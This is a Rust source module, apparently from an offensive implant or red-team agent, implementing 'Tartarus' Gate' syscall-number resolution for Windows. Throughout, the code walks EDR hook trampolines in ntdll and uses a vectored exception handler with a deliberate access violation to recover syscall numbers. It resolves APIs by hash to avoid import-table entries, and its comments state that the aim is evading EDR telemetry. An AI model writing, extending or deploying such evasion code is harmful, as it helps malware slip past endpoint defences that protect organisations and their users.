//! Tartarus' Gate / Exception-Based SSN Resolution.
//!
//! Resolves NT syscall numbers (SSNs) without reading the ntdll `.text`
//! section directly.  Instead, a Vectored Exception Handler (VEH) is
//! installed that catches `STATUS_ACCESS_VIOLATION` exceptions triggered by
//! intentionally causing faults at Nt* function entry points.  When the
//! exception fires, the VEH handler reads `CONTEXT.Rip` to locate the faulting
//! instruction, then scans backwards from that address for the `mov eax, imm32`
//! opcode that encodes the SSN — or walks the hook chain (JMP rel32 / JMP
//! qword ptr) until it reaches an unhooked stub.
//!
//! # Why This Exists
//!
//! EDR products hook Nt* stubs in ntdll by overwriting the prologue with a
//! JMP to their own memory.  Traditional unhooking (reading `.text` from disk,
//! comparing to the in-memory copy) is itself detectable:
//!   - File-read events on ntdll.dll trigger EDR telemetry.
//!   - Memory-comparison heuristics flag `.text` scanning.
//!   - KnownDlls section remapping leaves traceable section handles.
//!
//! Tartarus' Gate avoids all of these by never scanning `.text` proactively.
//! Instead, it triggers a single access violation at each hooked Nt* address,
//! and the VEH handler reads the SSN from the instruction stream visible to
//! the faulting context — which, even through hooks, still contains the SSN
//! in the `mov eax, imm32` instruction (EDRs must preserve the SSN for the
//! syscall to function correctly; they only redirect execution flow).
//!
//! # How It Works
//!
//! 1. **Install VEH**: A single VEH handler is registered as the first handler.
//!    It inspects `STATUS_ACCESS_VIOLATION` exceptions and checks whether the
//!    faulting address is within the ntdll module range.
//!
//! 2. **Probe**: For each target Nt* function, the resolver reads the function
//!    address from the PE export table.  It then triggers a read access violation
//!    at a known-unmapped address (a single-byte read from address 0x1 —
//!    `[0x1]`), while the thread-local capture state records the Nt* function
//!    address being resolved.
//!
//! 3. **Hook Chain Walk**: If the Nt* stub is hooked, the VEH handler walks
//!    the hook chain:
//!      - `E9 xx xx xx xx` → JMP rel32: follows the relative offset.
//!      - `FF 25 xx xx xx xx` → JMP [rip+disp32]: reads the indirect target.
//!      - Repeats until it finds `4C 8B D1` (MOV R10, RCX) — the standard
//!        Nt* prologue — or exhausts the chain depth limit.
//!
//! 4. **SSN Extraction**: Once an unhooked prologue is found, the handler scans
//!    for `B8 xx xx xx xx` (MOV EAX, imm32) to extract the SSN.
//!
//! 5. **Resolution**: The SSN is stored in a thread-local capture variable and
//!    the handler returns `EXCEPTION_CONTINUE_EXECUTION`.  The triggering read
//!    is retried (it will fault again, but this time the capture is already set,
//!    so the handler returns `EXCEPTION_CONTINUE_SEARCH` and the original fault
//!    is handled normally).
//!
//! # Limitations
//!
//! - **SSN only**: This module only resolves the SSN, not a `syscall; ret` gadget.
//!   The caller must obtain a gadget separately (e.g., from `.text` scan or
//!   Halo's Gate neighbour).
//! - **Not interrupt-safe**: The thread-local capture mechanism is not safe
//!   across asynchronous interruptions (APCs, suspend/resume).  Use only
//!   from the agent's controlled main loop.
//! - **Windows x86_64 only**: Uses x86-64 instruction encoding for pattern
//!   matching.
//!
//! # Integration
//!
//! The `resolve_ssn_via_exception` function is called from
//! `syscalls::get_bootstrap_ssn` when the `exception-ssn` feature is enabled
//! and the config selects `ExceptionBased` or `Hybrid` mode.  On failure, it
//! falls back to the existing Halo's Gate pipeline.

#![cfg(all(windows, feature = "direct-syscalls", target_arch = "x86_64"))]

use std::cell::Cell;
use std::sync::atomic::{AtomicBool, AtomicPtr, Ordering};
use std::sync::OnceLock;

// ─── Constants ────────────────────────────────────────────────────────────

/// NTSTATUS code for STATUS_ACCESS_VIOLATION.
const STATUS_ACCESS_VIOLATION: u32 = 0xC0000005;

/// VEH return: continue execution (exception handled).
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
/// VEH return: continue searching for handlers (not handled).
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Maximum number of hook-chain hops before giving up.
const MAX_HOOK_CHAIN_DEPTH: usize = 32;

/// Maximum number of bytes to scan backwards from a faulting address
/// looking for `mov eax, imm32` (B8 xx xx xx xx).
const BACKWARD_SCAN_RANGE: usize = 32;

/// Sentinel value indicating no Nt* function is being resolved.
const NO_ACTIVE_RESOLVE: usize = 0;

// ─── Minimal VEH Types ────────────────────────────────────────────────────
//
// Local definitions matching cet_bypass.rs pattern.  Avoids importing
// winapi::um::winnt types which would create IAT entries.

type DWORD = u32;
type PVOID = *mut std::ffi::c_void;

/// Maximum number of exception parameters.
const EXCEPTION_MAXIMUM_PARAMETERS: usize = 15;

/// Windows x64 EXCEPTION_RECORD.
#[repr(C)]
struct ExceptionRecord {
    ExceptionCode: DWORD,
    ExceptionFlags: DWORD,
    ExceptionRecord: *mut ExceptionRecord,
    ExceptionAddress: PVOID,
    NumberParameters: DWORD,
    ExceptionInformation: [usize; EXCEPTION_MAXIMUM_PARAMETERS],
}

/// Windows x64 CONTEXT structure (minimal — only Rip field needed here).
///
/// On x64, CONTEXT.Rip is at byte offset 0xF8:
///   P1Home–P6Home (48 B) + ContextFlags/MxCsr/Segs/EFlags (24 B) +
///   Dr0–Dr7 (48 B) + Rax–R15 (112 B) = 232 = 0xE8 … wait, 6×8+8+2×8+8×8+16×8
///   P1Home(8)+P2Home(8)+P3Home(8)+P4Home(8)+P5Home(8)+P6Home(8)=0x30
///   ContextFlags(4)+MxCsr(4)+SegCs(2)+SegDs(2)+SegEs(2)+SegFs(2)+
///   SegGs(2)+SegSs(2)+EFlags(4)=0x18 → cumulative 0x48
///   Dr0(8)×6=0x30 → cumulative 0x78
///   Rax–R15 (16 regs × 8 B = 0x80) → Rip starts at 0x78+0x80 = 0xF8.
#[repr(C)]
struct Context {
    _pad: [u8; 0xF8], // P1Home .. R15 (offsets 0x00 – 0xF7)
    Rip: u64,         // offset 0xF8
    _pad2: [u8; 0x3D0], // FltSave .. end (total CONTEXT = 0x4D0)
}

/// Windows EXCEPTION_POINTERS.
#[repr(C)]
struct ExceptionPointers {
    ExceptionRecord: *mut ExceptionRecord,
    ContextRecord: *mut Context,
}

// Static assertions for CONTEXT layout.
const _: () = assert!(std::mem::offset_of!(Context, Rip) == 0xF8);

// ─── Thread-Local Capture State ───────────────────────────────────────────
//
// When resolving an SSN, the calling thread stores the Nt* function address
// here before triggering the access violation.  The VEH handler reads this
// to know which function's prologue to inspect.

thread_local! {
    /// The Nt* function address currently being resolved, or 0 if idle.
    static PENDING_RESOLVE_ADDR: Cell<usize> = Cell::new(NO_ACTIVE_RESOLVE);

    /// The captured SSN, set by the VEH handler on successful extraction.
    static CAPTURED_SSN: Cell<Option<u32>> = Cell::new(None);

    /// Continuation address for the controlled fault probe (fault at 0x1).
    /// The inline-asm slow-path stores the address of the instruction after
    /// the faulting `mov al, [rax]` here before triggering the fault.  The
    /// VEH handler reads it to advance CONTEXT.Rip past the fault so that
    /// `EXCEPTION_CONTINUE_EXECUTION` does not cause an infinite fault loop.
    static FAULT_RESUME_RIP: Cell<usize> = Cell::new(0);
}

// ─── Global State ─────────────────────────────────────────────────────────

/// Whether the VEH handler has been installed.
static VEH_INSTALLED: AtomicBool = AtomicBool::new(false);

/// Address range of the loaded ntdll.dll (base, end).  Used by the VEH
/// handler to quickly reject non-ntdll exceptions.
static NTDLL_RANGE: OnceLock<(usize, usize)> = OnceLock::new();

// ─── Module-Internal Helpers ──────────────────────────────────────────────

/// Determine the loaded ntdll address range via pe_resolve.
///
/// Returns `(base, end)` where `end = base + SizeOfImage`.
fn get_ntdll_range() -> Option<(usize, usize)> {
    unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;

        // Read the PE headers to determine SizeOfImage.
        let dos = &*(ntdll_base as *const winapi::um::winnt::IMAGE_DOS_HEADER);
        if dos.e_magic != 0x5A4D {
            return None;
        }
        let nt = &*((ntdll_base + dos.e_lfanew as usize)
            as *const winapi::um::winnt::IMAGE_NT_HEADERS64);
        let size_of_image = nt.OptionalHeader.SizeOfImage as usize;

        Some((ntdll_base, ntdll_base + size_of_image))
    }
}

/// Follow a single hook hop from `addr`.
///
/// Recognises:
///   - `E9 xx xx xx xx` (JMP rel32): target = addr + 5 + rel32
///   - `FF 25 xx xx xx xx` (JMP [rip+disp32]): reads the 8-byte pointer
///
/// Returns the target address, or `None` if the bytes are not a recognised
/// hook instruction.
unsafe fn follow_hook_hop(addr: usize) -> Option<usize> {
    let bytes = std::slice::from_raw_parts(addr as *const u8, 6);

    if bytes[0] == 0xE9 {
        // JMP rel32: 5-byte instruction, target = addr + 5 + signed offset.
        let rel32 = i32::from_le_bytes(bytes[1..5].try_into().ok()?) as isize;
        let target = addr as isize + 5 + rel32;
        if target > 0 {
            return Some(target as usize);
        }
    }

    if bytes[0] == 0xFF && bytes[1] == 0x25 {
        // JMP [rip+disp32]: reads the 8-byte indirect pointer.
        let disp32 = i32::from_le_bytes(bytes[2..6].try_into().ok()?) as isize;
        let ptr_addr = (addr as isize + 6 + disp32) as usize;
        let target = std::ptr::read_unaligned(ptr_addr as *const usize);
        if target > 0 {
            return Some(target);
        }
    }

    None
}

/// Scan backwards from `addr` (up to `range` bytes) for `mov eax, imm32`
/// (B8 xx xx xx xx).  Returns the extracted SSN.
unsafe fn scan_for_mov_eax(addr: usize, range: usize) -> Option<u32> {
    let start = addr.saturating_sub(range);
    let scan_len = addr - start;
    if scan_len < 5 {
        return None;
    }
    let bytes = std::slice::from_raw_parts(start as *const u8, scan_len);

    // Scan backwards so we find the closest `B8` to the faulting address.
    for i in (0..=scan_len.saturating_sub(5)).rev() {
        if bytes[i] == 0xB8 {
            let ssn = u32::from_le_bytes(bytes[i + 1..i + 5].try_into().ok()?);
            // Sanity check: SSNs are currently in the range 0x0000–0x0FFF.
            // Reject obviously-wrong values from instruction noise.
            if ssn < 0x1000 {
                return Some(ssn);
            }
        }
    }
    None
}

/// Walk the hook chain starting at `addr` until an unhooked Nt* prologue is
/// found, then extract the SSN from it.
///
/// An unhooked prologue starts with `4C 8B D1` (MOV R10, RCX).  The SSN
/// follows in `B8 xx xx xx xx` (MOV EAX, imm32).
unsafe fn walk_hook_chain_and_extract_ssn(addr: usize) -> Option<u32> {
    let mut current = addr;

    for _ in 0..MAX_HOOK_CHAIN_DEPTH {
        let bytes = std::slice::from_raw_parts(current as *const u8, 8);

        // Check for standard unhooked Nt* prologue: 4C 8B D1 B8 xx xx xx xx.
        if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 {
            // Found unhooked stub — extract SSN from mov eax, imm32.
            if bytes[3] == 0xB8 {
                let ssn = u32::from_le_bytes(bytes[4..8].try_into().ok()?);
                if ssn < 0x1000 {
                    log::debug!(
                        "exception_ssn: found unhooked prologue at {:#x}, SSN={}",
                        current,
                        ssn
                    );
                    return Some(ssn);
                }
            }
            // Prologue without immediate MOV EAX — try scanning nearby.
            return scan_for_mov_eax(current + 3, BACKWARD_SCAN_RANGE);
        }

        // Not an unhooked prologue — try to follow the hook.
        match follow_hook_hop(current) {
            Some(next) => {
                log::trace!(
                    "exception_ssn: hook hop {:#x} → {:#x}",
                    current,
                    next
                );
                current = next;
            }
            None => {
                // Unknown instruction sequence — try scanning the current
                // address for mov eax anyway; some hooks embed the SSN
                // before redirecting.
                log::debug!(
                    "exception_ssn: unrecognized byte pattern at {:#x}: \
                     {:02X?}, attempting direct scan",
                    current,
                    &bytes[..4.min(bytes.len())]
                );
                return scan_for_mov_eax(current + 2, BACKWARD_SCAN_RANGE);
            }
        }
    }

    log::warn!(
        "exception_ssn: hook chain depth exhausted starting from {:#x}",
        addr
    );
    None
}

// ─── VEH Handler ──────────────────────────────────────────────────────────

/// VEH handler for exception-based SSN resolution.
///
/// This handler is called for every exception that passes through the VEH
/// chain.  It only acts on `STATUS_ACCESS_VIOLATION` exceptions where:
///   1. There is an active resolve request (PENDING_RESOLVE_ADDR is set).
///   2. The faulting address is within the ntdll module range.
///
/// When both conditions are met, the handler extracts the SSN from the Nt*
/// function's instruction stream and stores it in CAPTURED_SSN.
unsafe extern "system" fn veh_exception_ssn_handler(
    exception_pointers: *mut ExceptionPointers,
) -> i32 {
    if exception_pointers.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let ep = &*exception_pointers;
    if ep.ExceptionRecord.is_null() || ep.ContextRecord.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let rec = &*ep.ExceptionRecord;

    // Only handle STATUS_ACCESS_VIOLATION.
    if rec.ExceptionCode != STATUS_ACCESS_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Check if there's an active resolve request.
    let resolve_addr = PENDING_RESOLVE_ADDR.with(|cell| cell.get());
    if resolve_addr == NO_ACTIVE_RESOLVE {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Check if we already captured the SSN (second pass through handler).
    let already_captured = CAPTURED_SSN.with(|cell| cell.get().is_some());
    if already_captured {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Determine whether this is a controlled probe (fault at address 0x1
    // triggered intentionally by the slow-path inline asm).  If so,
    // FAULT_RESUME_RIP holds the continuation address and we must advance
    // CONTEXT.Rip past the faulting instruction before continuing.
    let resume_rip = FAULT_RESUME_RIP.with(|c| c.get());
    let is_controlled_probe = resume_rip != 0;

    // Need a mutable reference to the context so we can update Rip.
    let ctx = unsafe { &mut *ep.ContextRecord };
    let rip = ctx.Rip as usize;

    // For organic faults (e.g., guard page inside ntdll trampolines) verify
    // the RIP is within ntdll or very close to the resolve address.  For
    // controlled probes the fault occurs at address 0x1, so RIP points into
    // agent code — skip the ntdll range check entirely.
    if !is_controlled_probe {
        let ntdll_range = match NTDLL_RANGE.get() {
            Some(&r) => r,
            None => return EXCEPTION_CONTINUE_SEARCH,
        };

        if rip < ntdll_range.0 || rip >= ntdll_range.1 {
            let distance = if rip > resolve_addr {
                rip - resolve_addr
            } else {
                resolve_addr - rip
            };
            if distance > 4096 {
                return EXCEPTION_CONTINUE_SEARCH;
            }
        }
    }

    // Walk the hook chain from the resolve address and extract the SSN.
    let ssn = match walk_hook_chain_and_extract_ssn(resolve_addr) {
        Some(s) => s,
        None => {
            log::debug!(
                "exception_ssn: VEH handler could not extract SSN for \
                 resolve_addr={:#x}, rip={:#x}",
                resolve_addr,
                rip
            );
            return EXCEPTION_CONTINUE_SEARCH;
        }
    };

    // Store the captured SSN and clear the pending resolve.
    CAPTURED_SSN.with(|cell| cell.set(Some(ssn)));
    PENDING_RESOLVE_ADDR.with(|cell| cell.set(NO_ACTIVE_RESOLVE));

    // For controlled probes: redirect execution to the stored resume label
    // (the instruction immediately after `mov al, byte ptr [rax]`) so that
    // returning EXCEPTION_CONTINUE_EXECUTION does not re-execute the
    // faulting instruction and enter an infinite fault loop.
    if is_controlled_probe {
        ctx.Rip = resume_rip as u64;
        FAULT_RESUME_RIP.with(|c| c.set(0));
    }

    log::debug!(
        "exception_ssn: captured SSN={} for resolve_addr={:#x} \
         (fault rip={:#x}, controlled={})",
        ssn,
        resolve_addr,
        rip,
        is_controlled_probe
    );

    EXCEPTION_CONTINUE_EXECUTION
}

// ─── VEH Installation ─────────────────────────────────────────────────────

/// Install the VEH exception-based SSN resolution handler.
///
/// Must be called before any `resolve_ssn_via_exception` calls.
/// Safe to call multiple times — subsequent calls are no-ops.
fn install_veh_handler() -> bool {
    if VEH_INSTALLED.load(Ordering::Acquire) {
        return true;
    }

    // Cache the ntdll address range.
    let range = match get_ntdll_range() {
        Some(r) => r,
        None => {
            log::error!("exception_ssn: failed to determine ntdll address range");
            return false;
        }
    };
    let _ = NTDLL_RANGE.set(range);

    // Resolve AddVectoredExceptionHandler via pe_resolve (no IAT entry).
    let kernel32 = match unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
    } {
        Some(b) => b,
        None => {
            log::error!(
                "exception_ssn: failed to resolve kernel32 for AddVectoredExceptionHandler"
            );
            return false;
        }
    };

    let fn_addr = match unsafe {
        pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"AddVectoredExceptionHandler\0"),
        )
    } {
        Some(a) => a,
        None => {
            log::error!("exception_ssn: failed to resolve AddVectoredExceptionHandler");
            return false;
        }
    };

    type FnAddVectoredExceptionHandler = unsafe extern "system" fn(
        u32,
        unsafe extern "system" fn(*mut ExceptionPointers) -> i32,
    ) -> *mut std::ffi::c_void;

    let add_veh: FnAddVectoredExceptionHandler = unsafe { std::mem::transmute(fn_addr) };

    // Install as first handler (first=1) for maximum priority.
    let handle = unsafe { add_veh(1, veh_exception_ssn_handler) };
    if handle.is_null() {
        log::error!("exception_ssn: AddVectoredExceptionHandler returned NULL");
        return false;
    }

    VEH_INSTALLED.store(true, Ordering::Release);
    log::info!("exception_ssn: VEH handler installed successfully (ntdll range {:#x}–{:#x})", range.0, range.1);
    true
}

// ─── Direct SSN Resolution (No Fault) ─────────────────────────────────────
//
// Before resorting to exception-based resolution, try the simpler approach:
// resolve the Nt* function address from the PE export table and walk the
// hook chain directly.  This works for most EDR hooks that use JMP rel32
// or JMP [rip+disp32] without additional obfuscation.
//
// The exception-based approach is only needed when the hook trampoline
// itself is unreadable (e.g., non-present pages, guard pages) or when
// the EDR uses hardware breakpoints instead of inline hooks.

/// Resolve an Nt* function's SSN by walking the hook chain from its
/// export address.  No exception is triggered — this is a pure memory
/// read approach.
///
/// Returns `Some(ssn)` if the SSN could be extracted, `None` otherwise.
fn resolve_ssn_by_chain_walk(func_name: &str) -> Option<u32> {
    unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let mut name_bytes = func_name.as_bytes().to_vec();
        name_bytes.push(0);
        let target_hash = pe_resolve::hash_str(&name_bytes);
        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;

        walk_hook_chain_and_extract_ssn(func_addr)
    }
}

// ─── Public API ───────────────────────────────────────────────────────────

/// Resolve the SSN for a given Nt* function using exception-based resolution
/// (Tartarus' Gate).
///
/// This is the main entry point.  It first tries a direct chain walk (no
/// exception needed), then falls back to triggering an access violation if
/// the chain walk fails (e.g., the hook trampoline is on a non-present page).
///
/// Returns `Some(ssn)` on success, `None` on failure.
pub fn resolve_ssn_via_exception(func_name: &str) -> Option<u32> {
    // Ensure the VEH handler is installed.
    if !install_veh_handler() {
        log::warn!("exception_ssn: VEH handler not installed; trying chain walk only");
        return resolve_ssn_by_chain_walk(func_name);
    }

    // Fast path: try direct chain walk first (no exception overhead).
    if let Some(ssn) = resolve_ssn_by_chain_walk(func_name) {
        log::debug!(
            "exception_ssn: resolved SSN={} for {} via direct chain walk",
            ssn,
            func_name
        );
        return Some(ssn);
    }

    // Slow path: trigger an access violation and let the VEH handler
    // extract the SSN.
    log::debug!(
        "exception_ssn: direct chain walk failed for {}, trying exception-based resolution",
        func_name
    );

    // Resolve the target function address.
    let func_addr = unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let mut name_bytes = func_name.as_bytes().to_vec();
        name_bytes.push(0);
        let target_hash = pe_resolve::hash_str(&name_bytes);
        pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?
    };

    // Set up thread-local capture state.
    CAPTURED_SSN.with(|cell| cell.set(None));
    PENDING_RESOLVE_ADDR.with(|cell| cell.set(func_addr));

    // Trigger a STATUS_ACCESS_VIOLATION at address 0x1 (always unmapped).
    //
    // The inline-asm sequence:
    //   ① lea rax, [rip + 99f]          — compute the address of the resume
    //                                      label (the instruction after the
    //                                      faulting `mov al, [rax]`).
    //   ② mov qword ptr [resume], rax   — store it in the thread-local
    //                                      FAULT_RESUME_RIP slot so the VEH
    //                                      handler can advance CONTEXT.Rip.
    //   ③ mov rax, 1                    — load the permanently-unmapped address.
    //   ④ mov al, byte ptr [rax]        — STATUS_ACCESS_VIOLATION at address 1;
    //                                      the VEH handler catches this,
    //                                      walks the hook chain from func_addr,
    //                                      captures the SSN, sets Rip to the
    //                                      stored resume address, and returns
    //                                      EXCEPTION_CONTINUE_EXECUTION.
    //   ⑤ 99:                           — execution resumes here after the VEH
    //                                      handler has handled the exception.
    //
    // If the VEH handler successfully captured the SSN, CAPTURED_SSN will be
    // set when we reach the check below.

    // Obtain the raw pointer to the thread-local Cell's inner value so the
    // inline asm can write to it without an intervening Rust call (which
    // would corrupt the asm layout and invalidate the LEA-computed offset).
    let resume_rip_ptr: *mut usize =
        FAULT_RESUME_RIP.with(|c| c.as_ptr() as *mut usize);

    unsafe {
        std::arch::asm!(
            // ① Compute the address of the resume label and persist it.
            "lea rax, [rip + 99f]",
            "mov qword ptr [{resume}], rax",
            // ② Fault at address 1 — always an unmapped page.
            "mov rax, 1",
            "mov al, byte ptr [rax]",   // STATUS_ACCESS_VIOLATION at 0x1
            // ③ Resume here after the VEH handler advances CONTEXT.Rip.
            "99:",
            resume = in(reg) resume_rip_ptr,
            lateout("rax") _,
            options(nostack),
        );
    }

    // Clear pending state regardless of outcome.
    PENDING_RESOLVE_ADDR.with(|cell| cell.set(NO_ACTIVE_RESOLVE));
    FAULT_RESUME_RIP.with(|c| c.set(0));

    // Check if the VEH handler captured an SSN.
    let captured = CAPTURED_SSN.with(|cell| cell.get());
    if let Some(ssn) = captured {
        log::info!(
            "exception_ssn: resolved SSN={} for {} via exception-based probe (fault at 0x1)",
            ssn,
            func_name
        );
        return Some(ssn);
    }

    log::warn!("exception_ssn: failed to resolve SSN for {}", func_name);
    None
}

/// Check whether the exception-based SSN resolver is available (VEH installed).
pub fn is_available() -> bool {
    VEH_INSTALLED.load(Ordering::Acquire)
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scan_for_mov_eax_pattern() {
        // Craft a byte sequence: B8 0x2A 0x00 0x00 0x00 (mov eax, 42)
        let code: [u8; 16] = [
            0x4C, 0x8B, 0xD1, // mov r10, rcx
            0xB8, 0x2A, 0x00, 0x00, 0x00, // mov eax, 42
            0x0F, 0x05, // syscall
            0xC3, // ret
            0x00, 0x00, 0x00, 0x00, 0x00, // padding (5 bytes)
        ];

        unsafe {
            let ssn = scan_for_mov_eax(code.as_ptr() as usize + 8, 10);
            assert_eq!(ssn, Some(42));
        }
    }

    #[test]
    fn test_scan_for_mov_eax_not_found() {
        let code: [u8; 8] = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90];
        unsafe {
            let ssn = scan_for_mov_eax(code.as_ptr() as usize + 4, 4);
            assert_eq!(ssn, None);
        }
    }

    #[test]
    fn test_follow_hook_hop_jmp_rel32() {
        // E9 10 00 00 00 = JMP +16 (relative to next instruction)
        // At address 0x1000: target = 0x1000 + 5 + 16 = 0x1015
        let code: [u8; 16] = [
            0xE9, 0x10, 0x00, 0x00, 0x00, // jmp +16
            0x90, 0x90, 0x90, 0x90, 0x90, // nops
            0x90, 0x90, 0x90, 0x90, 0x90, // nops
            0x4C, // target is here (offset 15 from code start, or 0x100F)
        ];

        unsafe {
            let target = follow_hook_hop(code.as_ptr() as usize);
            let expected = code.as_ptr() as usize + 5 + 0x10;
            assert_eq!(target, Some(expected));
        }
    }

    #[test]
    fn test_follow_hook_hop_not_jmp() {
        // 4C 8B D1 = MOV R10, RCX (not a hook)
        let code: [u8; 8] = [0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00];
        unsafe {
            let target = follow_hook_hop(code.as_ptr() as usize);
            assert_eq!(target, None);
        }
    }

    #[test]
    fn test_walk_hook_chain_direct() {
        // Unhooked stub: 4C 8B D1 B8 0F 00 00 00
        let code: [u8; 8] = [
            0x4C, 0x8B, 0xD1, // mov r10, rcx
            0xB8, 0x0F, 0x00, 0x00, 0x00, // mov eax, 15
        ];

        unsafe {
            let ssn = walk_hook_chain_and_extract_ssn(code.as_ptr() as usize);
            assert_eq!(ssn, Some(15));
        }
    }

    #[test]
    fn test_ssn_sanity_check_rejects_large() {
        // B8 FF FF 00 00 — this is 0x0000FFFF which is > 0x1000, should be rejected.
        let code: [u8; 16] = [
            0x4C, 0x8B, 0xD1, // mov r10, rcx
            0xB8, 0xFF, 0xFF, 0x00, 0x00, // mov eax, 0xFFFF (too large)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];

        unsafe {
            let ssn = scan_for_mov_eax(code.as_ptr() as usize + 8, 10);
            assert_eq!(ssn, None, "SSN 0xFFFF should be rejected by sanity check");
        }
    }
}
